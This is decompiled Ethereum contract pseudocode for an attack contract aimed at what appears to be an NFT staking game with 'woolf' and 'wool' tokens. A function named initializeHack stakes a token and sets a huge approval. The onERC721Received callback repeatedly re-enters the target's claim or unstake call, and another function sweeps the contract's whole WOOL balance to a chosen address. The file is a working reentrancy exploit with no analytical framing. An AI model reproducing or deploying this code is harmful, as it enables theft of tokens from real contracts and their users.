contract main {




// =====================  Runtime code  =====================


uint256 count;
uint8 stor1; offset 176
uint16 tokenId; offset 160
address owner;
address woolfAddress;
address woolAddress;
address targetAddress;

function count() payable {
    return count
}

function tokenId() payable {
    return tokenId
}

function isRunning() payable {
    return bool(stor1)
}

function woolf() payable {
    return woolfAddress
}

function owner() payable {
    return owner
}

function wool() payable {
    return woolAddress
}

function target() payable {
    return targetAddress
}

function _fallback() payable {
    revert
}

function sub_499ec5cf(?) payable {
    require calldata.size - 4 >= 32
    require arg1 == uint16(arg1)
    tokenId = uint16(arg1)
}

function sub_d9da45f0(?) payable {
    staticcall woolAddress.0x70a08231 with:
            gas gas_remaining wei
           args this.address
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    return ext_call.return_data[0]
}

function approveAll(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    require ext_code.size(woolfAddress)
    call woolfAddress.0xa22cb465 with:
         gas gas_remaining wei
        args address(arg1), 1
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function sub_0ffe684a(?) payable {
    call woolAddress.approve(address arg1, uint256 arg2) with:
         gas gas_remaining wei
        args this.address, 2400000000 * 10^18
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == bool(ext_call.return_data[0])
}

function sub_e3858a4c(?) payable {
    require calldata.size - 4 >= 64
    require arg1 == address(arg1)
    require arg2 == uint16(arg2)
    require ext_code.size(woolfAddress)
    call woolfAddress.0x23b872dd with:
         gas gas_remaining wei
        args this.address, address(arg1), uint16(arg2)
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function sub_441d7f4b(?) payable {
    mem[128] = tokenId
    mem[160] = 0xb40b03d200000000000000000000000000000000000000000000000000000000
    mem[164] = 64
    idx = 0
    s = 128
    t = 260
    while idx < 1:
        mem[t] = mem[s + 30 len 2]
        idx = idx + 1
        s = s + 32
        t = t + 32
        continue 
    require ext_code.size(targetAddress)
    call targetAddress.0xb40b03d2 with:
         gas gas_remaining wei
        args Array(len=1, data=mem[260]), 1
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function sub_9b6abde8(?) payable {
    require calldata.size - 4 >= 32
    require arg1 == address(arg1)
    staticcall woolAddress.0x70a08231 with:
            gas gas_remaining wei
           args this.address
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    call woolAddress.0x23b872dd with:
         gas gas_remaining wei
        args this.address, address(arg1), ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == bool(ext_call.return_data[0])
    stor1 = 0
}

function initializeHack(uint16 arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    count = 0
    tokenId = arg1
    stor1 = 1
    mem[128] = arg1
    mem[160] = 0x5b51914200000000000000000000000000000000000000000000000000000000
    mem[164] = this.address
    idx = 0
    s = 128
    t = 260
    while idx < 1:
        mem[t] = mem[s + 30 len 2]
        idx = idx + 1
        s = s + 32
        t = t + 32
        continue 
    require ext_code.size(targetAddress)
    call targetAddress.0x5b519142 with:
         gas gas_remaining wei
        args address(this.address), Array(len=1, data=mem[260])
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    call woolAddress.approve(address arg1, uint256 arg2) with:
         gas gas_remaining wei
        args this.address, 2400000000 * 10^18
    require return_data.size >= 32
    require ext_call.return_data[0] == bool(ext_call.return_data[0])
}

function onERC721Received(address arg1, address arg2, uint256 arg3, bytes arg4) payable {
    require calldata.size - 4 >= 128
    require arg1 == arg1
    require arg2 == arg2
    require arg4 <= test266151307()
    require arg4 + 35 < calldata.size
    require arg4.length <= test266151307()
    require arg4 + arg4.length + 36 <= calldata.size
    if count <= 6:
        mem[128] = tokenId
        if 1 > !count:
            revert with 0, 17
        count++
        require ext_code.size(woolfAddress)
        call woolfAddress.0x23b872dd with:
             gas gas_remaining wei
            args this.address, targetAddress, tokenId
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        mem[160] = 0xb40b03d200000000000000000000000000000000000000000000000000000000
        mem[164] = 64
        idx = 0
        s = 128
        t = 260
        while idx < 1:
            mem[t] = mem[s + 30 len 2]
            idx = idx + 1
            s = s + 32
            t = t + 32
            continue 
        require ext_code.size(targetAddress)
        call targetAddress.0xb40b03d2 with:
             gas gas_remaining wei
            args Array(len=1, data=mem[260]), 1
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
    return 0x150b7a0200000000000000000000000000000000000000000000000000000000
}



}
